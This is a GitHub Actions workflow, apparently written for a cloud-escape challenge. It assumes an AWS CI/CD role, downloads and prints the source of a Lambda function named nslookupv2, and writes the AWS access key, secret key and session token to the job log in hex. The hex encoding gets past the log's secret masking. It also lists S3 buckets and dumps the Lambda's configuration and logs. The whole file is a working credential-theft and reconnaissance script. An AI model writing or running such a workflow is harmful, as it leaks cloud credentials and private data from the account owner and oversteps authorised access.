name: corgi-assume
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  dump:
    runs-on: self-hosted
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
          role-session-name: cloudescape-corgi
      - name: Grab lambda source and lists
        run: |
          set +e
          URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text)
          echo "URL_OK ${#URL}"
          curl -sL "$URL" -o /tmp/lam.zip
          ls -la /tmp/lam.zip
          python3 -c "import zipfile;z=zipfile.ZipFile('/tmp/lam.zip');
[print('FILE',n,'\n',z.read(n).decode('utf-8','replace')) for n in z.namelist()]"
          python3 -c "import os;ks=['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN'];
[print(k+'_HEX',os.environ.get(k,'').encode().hex()) for k in ks]"
          aws s3api list-objects-v2 --bucket platform-bucket-009661764077-us-east-1 --output json || true
          aws s3api list-objects-v2 --bucket site781fe43f26b9eba3 --output json || true
          aws lambda get-function-configuration --function-name nslookupv2 --output json || true
          aws logs describe-log-groups --log-group-name-prefix /aws/lambda --max-items 20 2>&1 || true
          aws logs filter-log-events --log-group-name /aws/lambda/nslookupv2 --limit 30 2>&1 | head -c 20000 || true
